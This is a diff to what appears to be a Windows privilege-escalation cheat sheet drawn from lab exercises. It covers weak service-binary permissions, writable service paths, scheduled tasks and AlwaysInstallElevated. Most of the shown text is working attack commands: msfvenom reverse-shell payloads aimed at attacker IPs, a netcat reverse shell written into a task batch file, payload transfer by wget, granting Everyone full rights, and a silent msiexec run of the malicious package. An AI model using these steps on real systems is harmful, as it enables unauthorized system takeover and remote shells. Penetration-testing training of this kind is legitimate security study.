@@ -126,6 +126,9 @@ wmic process list full  # View all the details of the processing
 sc queryex type=service # List of all running services
 sc qc <service name> # Check the configuration details
 
+icacls WService.exe # Check Permission Service File exe
+accesschk64.exe -qlc thmservice 
+
 Get-SmbServerConfiguration # Check the SMB version running on a Windows system (in the internal network)
 ----------------------------------------------------------------
 # Check services through the Windows Registry
@@ -147,7 +150,7 @@ reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsScheduler 
 1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
 sc qc WindowsScheduler # cmd
 sc.exe qc WindowsScheduler # powershell
-2️⃣ # We check the executable file of this service has Weak permission or not
+2️⃣ # Check Permission Service File
 icacls C:\PROGRA~2\SYSTEM~1\WService.exe 
 3️⃣ # Making a malicious Payload with MSFvenom:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4445 -f exe-service -o rev-svc.exe
@@ -174,9 +177,9 @@ sc.exe start windowsscheduler # powershell
 1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
 sc qc WindowsScheduler # cmd
 sc.exe qc WindowsScheduler # powershell
-2️⃣ # Checking access level on vulnerable pathway
+2️⃣ # Checking access level on vulnerable path
 icacls C:\MyPrograms
-3️⃣ # Making a malicious Payload with MSFvenom:
+3️⃣ # Making a malicious Payload with MSFvenom
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4446 -f exe-service -o rev-svc2.exe
 4️⃣ # Transfer of malicious file to the victim system
 python3 -m http.server # attackbox
@@ -261,7 +264,7 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 schtasks # List recipe all scheduled tasks
 schtasks /query /fo LIST /v # list of all the scheduled tasks in the system, along with the full details of each task
 schtasks /query /tn vulntask /fo list /v  # Receive complete information about a particular task (eg Vulntask)
-2️⃣ # check the file permissions in target system
+2️⃣ # Check Permission File
 icacls c:\tasks\schtask.bat  
 3️⃣ # Add a Reverse Shell in the executable file
 echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat  
@@ -275,14 +278,22 @@ schtasks /run /tn vulntask
 **Description:** "AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
 When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.
 ```powershell
-# If the value of Alwaysinstallelelevated in both keys is 1, the system is vulnerable.
+1️⃣ # Check the value of Alwaysinstallelelevated in Windows Registry setting if both keys is 1, the system is vulnerable.
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 
---------------------------------------------------------------------------------------------------------------------------------
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
-# transfer malicious.msi file to our kali # target system
---------------------------------------------------------------------------------------------------------------------------------
-msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
+2️⃣ # Making a malicious Payload with MSFvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi 
+4️⃣ # Transfer of malicious file to the victim system
+python3 -m http.server # attackbox
+wget http://10.11.99.141:8000/malicious.msi -O malicious.msi # target system
+5️⃣ # Insert malicious file
+move C:\Users\thm-unpriv\malicious.msi C:\Windows\Temp\malicious.msi
+6️⃣ # Giving all users permission for run this file
+icacls C:\Windows\Temp\malicious.msi /grant Everyone:F
+7️⃣ # Launch Lenner on the attackbox
+nc -lvp 4444
+8️⃣ # execute malicious file (malicious.msi) for get access
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi 
 ```
 
 ## Strart-Powershell-With-Admin ✅
